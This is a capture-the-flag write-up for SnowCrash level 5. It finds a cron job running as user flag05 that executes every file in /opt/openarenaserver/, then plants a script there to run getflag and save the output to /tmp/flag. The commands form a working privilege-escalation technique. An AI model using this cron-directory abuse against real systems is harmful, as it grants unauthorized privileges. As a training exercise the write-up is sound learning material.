# Level05

On login you will see the following:

```
You have new mail.
```

Checking on the internet, it seems there is something in `/var/mail`.

```
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

It seems like it executes something as flag05. Lets check it out.

```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
 (ulimit -t 5; bash -x "$i")
 rm -f "$i"
done
```

It seems to execute all programs in `/opt/openarenaserver/`.
We can definitly use this to our advantage.

```
echo 'getflag > /tmp/flag' > /opt/openarenaserver/exploit.sh

#once the cronjob is done, it will show in the correct file
cat /tmp/flag
```
